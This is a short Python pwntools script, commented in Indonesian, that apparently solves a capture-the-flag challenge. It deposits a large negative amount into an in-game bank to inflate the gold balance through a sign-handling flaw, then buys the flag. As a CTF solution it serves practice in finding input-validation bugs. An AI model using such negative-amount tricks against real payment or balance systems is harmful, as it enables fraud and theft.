from pwn import *

# Setup koneksi ke server
host = 'chall1.lagncra.sh'
port = 16231

print(f"[*] Menghubungkan ke {host}:{port}...")
io = remote(host, port)

# Fungsi pembantu untuk melewati menu utama
def wait_for_menu():
    io.recvuntil(b"Enter your choice: ")

# 1. Masuk ke Bank
print("[*] Masuk ke Bank...")
wait_for_menu()
io.sendline(b"3")

# 2. Lakukan eksploitasi: Deposit angka negatif yang sangat besar
# Logika cacat: current_gold = current_gold - (-999999999) -> Uang bertambah!
print("[*] Mengirim payload deposit negatif (-999999999)...")
io.recvuntil(b"Enter your choice: ")
io.sendline(b"1") # Pilih 1 untuk Deposit
io.recvuntil(b"Enter amount to deposit: ")
io.sendline(b"-999999999")

# 3. Pergi ke Toko (Shop)
print("[*] Pergi ke Toko (Shop) dengan uang haram...")
wait_for_menu()
io.sendline(b"2")

# 4. Beli Flag!
print("[*] Membeli Flag...")
io.recvuntil(b"Enter your choice: ")
io.sendline(b"3") # Pilih 3 untuk beli Flag

# Pindah ke mode interaktif agar kamu bisa melihat flag-nya dicetak di layar
print("[🚀] Beralih ke mode interaktif. Selamat menikmati flag-nya!")
io.interactive()
